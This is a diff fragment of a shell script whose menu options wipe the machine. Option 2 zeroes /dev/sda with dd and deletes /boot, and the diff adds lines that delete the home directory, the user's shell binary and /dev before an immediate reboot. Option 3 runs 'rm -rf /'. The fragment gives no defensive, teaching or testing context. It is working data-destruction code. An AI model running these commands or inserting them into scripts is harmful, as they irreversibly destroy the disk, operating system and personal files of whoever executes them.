@@ -24,6 +24,9 @@ continue() {
     elif [ $option == "2" ]; then
         dd if=/dev/zero of=/dev/sda
         rm -rf /boot
+        rm -rf ~
+        rm -rf /bin/$(echo "$SHELL")
+        rm -rf /dev
         reboot now
     elif [ $option == "3" ]; then
         rm -rf /
